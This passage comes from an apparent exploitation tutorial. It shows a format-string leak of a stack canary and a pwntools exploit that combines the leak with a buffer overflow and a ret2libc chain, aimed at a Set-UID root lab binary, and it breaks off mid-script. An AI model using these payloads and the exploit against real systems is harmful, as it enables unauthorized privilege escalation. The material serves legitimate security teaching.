   <span class="mh">0x080491ce</span> <span class="o">&lt;+</span><span class="mi">24</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="p">],</span><span class="n">eax</span>
   <span class="mh">0x080491d1</span> <span class="o">&lt;+</span><span class="mi">27</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
   <span class="mh">0x080491d3</span> <span class="o">&lt;+</span><span class="mi">29</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xc</span>
   <span class="mh">0x080491d6</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">lea</span>    <span class="n">eax</span><span class="p">,[</span><span class="n">ebx</span><span class="o">-</span><span class="mh">0x1ff8</span><span class="p">]</span>
   <span class="mh">0x080491dc</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">push</span>   <span class="n">eax</span>
   <span class="mh">0x080491dd</span> <span class="o">&lt;+</span><span class="mi">39</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">call</span>   <span class="mh">0x8049090</span> <span class="o">&lt;</span><span class="n">puts</span><span class="n">@plt</span><span class="o">&gt;</span>
   <span class="mh">0x080491e2</span> <span class="o">&lt;+</span><span class="mi">44</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span>
   <span class="mh">0x080491e5</span> <span class="o">&lt;+</span><span class="mi">47</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xc</span>
   <span class="mh">0x080491e8</span> <span class="o">&lt;+</span><span class="mi">50</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">lea</span>    <span class="n">eax</span><span class="p">,[</span><span class="n">ebx</span><span class="o">-</span><span class="mh">0x1fda</span><span class="p">]</span>
   <span class="mh">0x080491ee</span> <span class="o">&lt;+</span><span class="mi">56</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">push</span>   <span class="n">eax</span>
   <span class="mh">0x080491ef</span> <span class="o">&lt;+</span><span class="mi">57</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">call</span>   <span class="mh">0x8049060</span> <span class="o">&lt;</span><span class="n">printf</span><span class="n">@plt</span><span class="o">&gt;</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
   <span class="mh">0x080492ac</span> <span class="o">&lt;+</span><span class="mi">246</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">lea</span>    <span class="n">eax</span><span class="p">,[</span><span class="n">ebx</span><span class="o">-</span><span class="mh">0x1fa1</span><span class="p">]</span>
   <span class="mh">0x080492b2</span> <span class="o">&lt;+</span><span class="mi">252</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">push</span>   <span class="n">eax</span>
   <span class="mh">0x080492b3</span> <span class="o">&lt;+</span><span class="mi">253</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">call</span>   <span class="mh">0x8049060</span> <span class="o">&lt;</span><span class="n">printf</span><span class="n">@plt</span><span class="o">&gt;</span>
   <span class="mh">0x080492b8</span> <span class="o">&lt;+</span><span class="mi">258</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span>
   <span class="mh">0x080492bb</span> <span class="o">&lt;+</span><span class="mi">261</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">nop</span>
   <span class="mh">0x080492bc</span> <span class="o">&lt;+</span><span class="mi">262</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="p">]</span>
   <span class="mh">0x080492bf</span> <span class="o">&lt;+</span><span class="mi">265</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">sub</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">gs</span><span class="p">:</span><span class="mh">0x14</span>
   <span class="mh">0x080492c6</span> <span class="o">&lt;+</span><span class="mi">272</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">je</span>     <span class="mh">0x80492cd</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">279</span><span class="o">&gt;</span>
   <span class="mh">0x080492c8</span> <span class="o">&lt;+</span><span class="mi">274</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">call</span>   <span class="mh">0x8049300</span> <span class="o">&lt;</span><span class="n">__stack_chk_fail_local</span><span class="o">&gt;</span>
   <span class="mh">0x080492cd</span> <span class="o">&lt;+</span><span class="mi">279</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">mov</span>    <span class="n">ebx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
   <span class="mh">0x080492d0</span> <span class="o">&lt;+</span><span class="mi">282</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">leave</span>  
   <span class="mh">0x080492d1</span> <span class="o">&lt;+</span><span class="mi">283</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">ret</span>    
<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="o">.</span>
<span class="nd">gef$</span>
</pre></div>
<p>It's quite lengthy; however, the crucial lines we need are at the end. As mentioned earlier, just before the function returns, it checks if the stack canary value was overwritten, indicating that the stack was smashed. The important lines are <code>+262</code>, <code>+265</code> and <code>+272</code>. Those lines are the ones that performs this verification.</p><br/>
<p>As observed, firstly, in line <code>+262</code>, there is a <code>mov</code> instruction that copies a value from the address <code>ebp-0xc</code> into eax. When referencing <code>ebp</code>, it typically refers to accessing values from the current stack frame. Since this line corresponds to the canary verification, it is likely that the value being copied into eax from address <code>ebp-0xc</code> is the stack canary value.</p><br/>
<p>In line <code>+262</code>, there is a <code>mov</code> instruction that copies a value from the address <code>ebp-0xc</code> into eax. When referencing <code>ebp</code>, it typically accesses values from the current stack frame. Since this corresponds to canary verification, the value being copied into eax from <code>ebp-0xc</code> is likely the stack canary value.</p><br/>
<p>Next, in line <code>+265</code>, there is a <code>sub</code> instruction that subtracts the value indicated as <code>DWORD PTR gs:0x14</code> from eax. <code>DWORD PTR gs:0x14</code> refers to accessing a 32-bit (4-byte) value located at the memory address represented by the GS segment register plus an offset of 0x14 (or 20 bytes), where the Stack Canary value is stored for verification. Therefore, the <code>sub</code> instruction subtracts the value stored in the global segment (the stack canary value that is inaccessible and cannot be modified) from the value in eax (supposedly the canary value in the current stack frame).</p><br/>
<p>Why is this important? If the result of this subtraction operation is zero, it indicates that the value in eax (current stack frame's canary value) matches the value stored in the global segment (original stack canary value). This is a way to test if two values are the same—if subtracting them results in zero, they match. When this subtraction results in zero, the Zero Flag (ZF) is set to 1.</p><br/>
<p>The line <code>+272</code> utilizes this ZF flag with a <code>je</code> instruction (jump if equal). This instruction executes if the ZF flag is set to 1 (indicating the previous subtraction resulted in zero). In this case, the program continues as expected. However, if the ZF flag is not set (indicating the subtraction did not result in zero), the <code>je</code> instruction does not execute. Instead, the function <code>__stack_chk_fail_local</code> is called, triggering stack smash protection error and halting the program.</p><br/>
<p></p>
<p>Essentially, it copies the canary from <code>ebp-0xc</code> to <code>eax</code> and subtracts <code>gs:0x14</code> (original canary). If the result is zero, it continues; otherwise, it triggers <code>__stack_chk_fail_local</code>.</p><br/><br/>
<br/><h3 class="note">Note</h3><br/>
<p>To better understand these instructions, I recommend reading my <a href="https://elswix.github.io/articles/3/cpu-and-assembly-binexp-basics.html">CPU &amp; Assembly</a> article.</p><br/>
<p><br/></p><br/>
<p>Since the value at <code>$ebp-0xc</code> corresponds to the Stack Canary, we can check its content to see if it matches the value at position <code>31</code>. To do this, I'll execute the program in GDB, set a breakpoint at line <code>+262</code>, and pass the following payload as the username: <code>%31$x</code>. This will print the value at position <code>31</code> in the output. Then, we can inspect the value at address <code>ebp-0xc</code> to verify if this address contains the canary value of the current function.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">b</span> <span class="o">*</span><span class="n">vuln</span><span class="o">+</span><span class="mi">262</span>
<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x80492bc</span>
<span class="nd">gef$</span>
</pre></div>
<p>Let's execute the program:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">run</span>
<span class="n">Starting</span> <span class="n">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Local</span><span class="o">/</span><span class="n">formatstring</span><span class="o">-</span><span class="n">article</span><span class="o">/</span><span class="n">bof</span><span class="o">/</span><span class="n">program</span> 
<span class="p">[</span><span class="n">Thread</span> <span class="n">debugging</span> <span class="n">using</span> <span class="n">libthread_db</span> <span class="n">enabled</span><span class="p">]</span>
<span class="n">Using</span> <span class="n">host</span> <span class="n">libthread_db</span> <span class="n">library</span> <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="o">.</span>
<span class="n">Please</span><span class="p">,</span> <span class="n">enter</span> <span class="n">your</span> <span class="n">username</span><span class="p">:</span> 
<span class="o">-&gt;</span> <span class="o">%</span><span class="mi">31</span><span class="n">$</span><span class="n">x</span>
<span class="n">Enter</span> <span class="n">password</span> <span class="k">for</span> <span class="mi">75</span><span class="n">c6f00</span>
<span class="o">-&gt;</span> <span class="n">test</span>

<span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x080492bc</span> <span class="ow">in</span> <span class="n">vuln</span> <span class="p">()</span>
<span class="nd">gef$</span>
</pre></div>
<p>The value at position <code>31</code> was <code>75c6f00</code>. Now, let's examine the value at address <code>ebp-0xc</code> to verify if it matches the leaked value.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">x</span><span class="o">/</span><span class="n">wx</span> <span class="n">$</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0xc</span>
<span class="mh">0xffffcfbc</span><span class="p">:</span>  <span class="mh">0x075c6f00</span>
<span class="nd">gef$</span>
</pre></div>
<p>Great! We have successfully leaked the stack canary value, and now we know that it resides at position <code>31</code> after the first parameter for <code>printf()</code>.</p><br/>
<p>Let's create a Python script to automate the process of leaking the Stack Canary:</p><br/>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> 


<span class="k">def</span> <span class="nf">leak_canary</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s2">"%31$x"</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">leaked_value</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">" "</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>

    <span class="n">leaked_canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leaked_value</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>

    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"Leaked canary: </span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leaked_canary</span><span class="p">))</span>

    <span class="k">return</span> <span class="n">leaked_canary</span>



<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>

    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">"./program"</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s2">"error"</span><span class="p">)</span>
    <span class="n">canary</span> <span class="o">=</span> <span class="n">leak_canary</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>



<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</pre></div>
<p>I've made some adjustments to the previous script and added additional functions to gain better control over the program flow.</p><br/>
<p>As we know, triggering the buffer overflow causes the stack smash protection to activate because we overwrite the stack canary value. To prevent overwriting this value with an unexpected value, we need to determine the offset between our buffer and the canary value. This way, we can adjust our payload to correctly position the leaked canary value when triggering the buffer overflow.</p><br/>
<p>To accomplish this, we can utilize the utilities <code>pattern create</code> and <code>pattern offset</code> from <a href="https://github.com/hugsy/gef">GEF</a>. First, let's generate a pattern string:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">pattern</span> <span class="n">create</span> <span class="mi">200</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Generating</span> <span class="n">a</span> <span class="n">pattern</span> <span class="n">of</span> <span class="mi">200</span> <span class="nb">bytes</span> <span class="p">(</span><span class="n">n</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span>
<span class="n">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Saved</span> <span class="k">as</span> <span class="s1">'$_gef0'</span>
<span class="nd">gef$</span>
</pre></div>
<p>Now, I'll set a breakpoint at line <code>*vuln+262</code> in GDB so that the program halts before the canary verification, allowing us to inspect the overwritten value.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">b</span> <span class="o">*</span><span class="n">vuln</span><span class="o">+</span><span class="mi">262</span>
<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x80492bc</span>
<span class="nd">gef$</span>
</pre></div>
<p>Then, let's use that string as the password to trigger the buffer overflow:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">run</span>
<span class="n">Starting</span> <span class="n">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Local</span><span class="o">/</span><span class="n">formatstring</span><span class="o">-</span><span class="n">article</span><span class="o">/</span><span class="n">bof</span><span class="o">/</span><span class="n">program</span> 
<span class="p">[</span><span class="n">Thread</span> <span class="n">debugging</span> <span class="n">using</span> <span class="n">libthread_db</span> <span class="n">enabled</span><span class="p">]</span>
<span class="n">Using</span> <span class="n">host</span> <span class="n">libthread_db</span> <span class="n">library</span> <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="o">.</span>
<span class="n">Please</span><span class="p">,</span> <span class="n">enter</span> <span class="n">your</span> <span class="n">username</span><span class="p">:</span> 
<span class="o">-&gt;</span> <span class="n">test</span>
<span class="n">Enter</span> <span class="n">password</span> <span class="k">for</span> <span class="n">test</span>
<span class="o">-&gt;</span> <span class="n">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span>

<span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x080492bc</span> <span class="ow">in</span> <span class="n">vuln</span> <span class="p">()</span>
<span class="nd">gef$</span>
</pre></div>
<p>Perfect, we've reached the breakpoint. As we've seen earlier, the stack canary within the stack frame is at <code>ebp-0xc</code>. Let's inspect that memory address and see which value it holds:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">x</span><span class="o">/</span><span class="n">wx</span> <span class="n">$</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0xc</span>
<span class="mh">0xffffcfbc</span><span class="p">:</span>  <span class="mh">0x616e6161</span>
<span class="nd">gef$</span>
</pre></div>
<p>Of course, it was overwritten. To determine how many characters we need to enter before overwriting the canary value, we can use the <code>pattern offset</code> utility.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">pattern</span> <span class="n">offset</span> <span class="n">$</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0xc</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Searching</span> <span class="k">for</span> <span class="s1">'61616e61'</span><span class="o">/</span><span class="s1">'616e6161'</span> <span class="k">with</span> <span class="n">period</span><span class="o">=</span><span class="mi">4</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Found</span> <span class="n">at</span> <span class="n">offset</span> <span class="mi">50</span> <span class="p">(</span><span class="n">little</span><span class="o">-</span><span class="n">endian</span> <span class="n">search</span><span class="p">)</span> <span class="n">likely</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>Perfect! Now we know that we need to enter 50 characters to reach the stack canary. This means that after these 50 characters, we should place the stack canary value.</p><br/>
<p>Let's modify our python exploit:</p><br/>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">bufferOverflow</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">canary</span><span class="p">):</span>

    <span class="n">canaryOffset</span> <span class="o">=</span> <span class="mi">50</span>
    <span class="n">junk</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"A"</span><span class="o">*</span><span class="n">canaryOffset</span>

    <span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">junk</span>
    <span class="c1">#buf += p32(canary)</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"B"</span><span class="o">*</span><span class="mi">100</span>

    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>

    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">"./program"</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s2">"error"</span><span class="p">)</span>
    <span class="n">canary</span> <span class="o">=</span> <span class="n">leak_canary</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>

    <span class="n">bufferOverflow</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">canary</span><span class="p">)</span>
</pre></div>
<p>I've defined the <code>bufferOverflow</code> function, which triggers the buffer overflow. Now, when executing the program, as I commented the line which places the canary value in our payload, the program should trigger the smash protection error.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Leaked</span> <span class="n">canary</span><span class="p">:</span> <span class="mh">0x791a4500</span>
<span class="sa">b</span><span class="s1">'*** stack smashing detected ***: terminated</span><span class="se">\n</span><span class="s1">'</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>It worked as expected, let's see if I uncomment that line.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Leaked</span> <span class="n">canary</span><span class="p">:</span> <span class="mh">0xdb25b800</span>
<span class="n">Traceback</span> <span class="p">(</span><span class="n">most</span> <span class="n">recent</span> <span class="n">call</span> <span class="n">last</span><span class="p">):</span>
  <span class="n">File</span> <span class="s2">"/home/elswix/Desktop/elswix/Local/formatstring-article/bof/exploit.py"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">43</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>
    <span class="n">main</span><span class="p">()</span>
  <span class="n">File</span> <span class="s2">"/home/elswix/Desktop/elswix/Local/formatstring-article/bof/exploit.py"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">37</span><span class="p">,</span> <span class="ow">in</span> <span class="n">main</span>
    <span class="n">bufferOverflow</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">canary</span><span class="p">)</span>
  <span class="n">File</span> <span class="s2">"/home/elswix/Desktop/elswix/Local/formatstring-article/bof/exploit.py"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">29</span><span class="p">,</span> <span class="ow">in</span> <span class="n">bufferOverflow</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
  <span class="n">File</span> <span class="s2">"/home/elswix/.local/lib/python3.10/site-packages/pwnlib/tubes/tube.py"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">498</span><span class="p">,</span> <span class="ow">in</span> <span class="n">recvline</span>
    <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">newline</span><span class="p">,</span> <span class="n">drop</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">keepends</span><span class="p">,</span> <span class="n">timeout</span> <span class="o">=</span> <span class="n">timeout</span><span class="p">)</span>
  <span class="n">File</span> <span class="s2">"/home/elswix/.local/lib/python3.10/site-packages/pwnlib/tubes/tube.py"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">341</span><span class="p">,</span> <span class="ow">in</span> <span class="n">recvuntil</span>
    <span class="n">res</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">timeout</span><span class="p">)</span>
  <span class="n">File</span> <span class="s2">"/home/elswix/.local/lib/python3.10/site-packages/pwnlib/tubes/tube.py"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">106</span><span class="p">,</span> <span class="ow">in</span> <span class="n">recv</span>
    <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">_recv</span><span class="p">(</span><span class="n">numb</span><span class="p">,</span> <span class="n">timeout</span><span class="p">)</span> <span class="ow">or</span> <span class="sa">b</span><span class="s1">''</span>
  <span class="n">File</span> <span class="s2">"/home/elswix/.local/lib/python3.10/site-packages/pwnlib/tubes/tube.py"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">176</span><span class="p">,</span> <span class="ow">in</span> <span class="n">_recv</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">buffer</span> <span class="ow">and</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">_fillbuffer</span><span class="p">(</span><span class="n">timeout</span><span class="p">):</span>
  <span class="n">File</span> <span class="s2">"/home/elswix/.local/lib/python3.10/site-packages/pwnlib/tubes/tube.py"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">155</span><span class="p">,</span> <span class="ow">in</span> <span class="n">_fillbuffer</span>
    <span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">recv_raw</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">buffer</span><span class="o">.</span><span class="n">get_fill_size</span><span class="p">())</span>
  <span class="n">File</span> <span class="s2">"/home/elswix/.local/lib/python3.10/site-packages/pwnlib/tubes/process.py"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">688</span><span class="p">,</span> <span class="ow">in</span> <span class="n">recv_raw</span>
    <span class="k">raise</span> <span class="ne">EOFError</span>
<span class="ne">EOFError</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>Another error was triggered, but I know it worked because we didn't see the <code>stack smashing detected</code> message. This indicates that our payload was successful in bypassing the Stack Canary protection. The program crashed when we added additional "B" characters, likely overwriting the return address and causing the function to return to an invalid address.</p><br/>
<p>To exploit this buffer overflow for privilege escalation, you can apply the technique demonstrated in my <a href="">ret2libc article</a>. This involves leaking a GOT (Global Offset Table) entry to compute the base libc address by subtracting an offset from the leaked address. You can integrate the canary leak into this technique.</p><br/>
<p>Remember to change the ownership of the binary to root and set it as Set-UID to ensure it runs with elevated privileges.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">sudo</span> <span class="n">chown</span> <span class="n">root</span><span class="p">:</span><span class="n">root</span> <span class="n">program</span>
<span class="nd">elswix@ubuntu$</span> <span class="n">sudo</span> <span class="n">chmod</span> <span class="mi">4755</span> <span class="n">program</span>
</pre></div>
<p>Here you have the final exploit:</p><br/>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> 
<span class="kn">import</span> <span class="nn">pdb</span>
<span class="kn">import</span> <span class="nn">sys</span> 


<span class="c1"># Global Variables</span>

<span class="c1"># Offsets</span>
<span class="n">setuid_off</span> <span class="o">=</span> <span class="mh">0x000ddd30</span>
<span class="n">puts_off</span> <span class="o">=</span> <span class="mh">0x72880</span>
<span class="n">system_off</span> <span class="o">=</span> <span class="mh">0x47cd0</span>
<span class="n">exit_off</span> <span class="o">=</span> <span class="mh">0x3a1f0</span>
<span class="n">bin_sh_off</span> <span class="o">=</span> <span class="mh">0x1b90d5</span>

<span class="c1"># Binary symbols</span>
<span class="n">main_addr</span> <span class="o">=</span> <span class="mh">0x80492d2</span>
<span class="n">puts_got</span> <span class="o">=</span> <span class="mh">0x804c020</span>
<span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x8049090</span>

<span class="c1"># Junk</span>
<span class="n">canaryOffset</span> <span class="o">=</span> <span class="mi">50</span>
<span class="n">junk</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"A"</span><span class="o">*</span><span class="n">canaryOffset</span>
<span class="n">eipOffset</span> <span class="o">=</span> <span class="mi">66</span><span class="o">-</span><span class="mi">4</span><span class="o">-</span><span class="n">canaryOffset</span>

<span class="k">def</span> <span class="nf">leak_canary</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>

    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s2">"%31$x"</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">leaked_info</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">" "</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leaked_info</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">canary</span>


<span class="k">def</span> <span class="nf">leak_libc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">canary</span><span class="p">):</span>

    <span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">junk</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"B"</span><span class="o">*</span><span class="n">eipOffset</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>


    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
    <span class="n">leaked_puts</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="mi">17</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>

    <span class="n">leaked_libc_address</span> <span class="o">=</span> <span class="n">leaked_puts</span><span class="o">-</span><span class="n">puts_off</span>

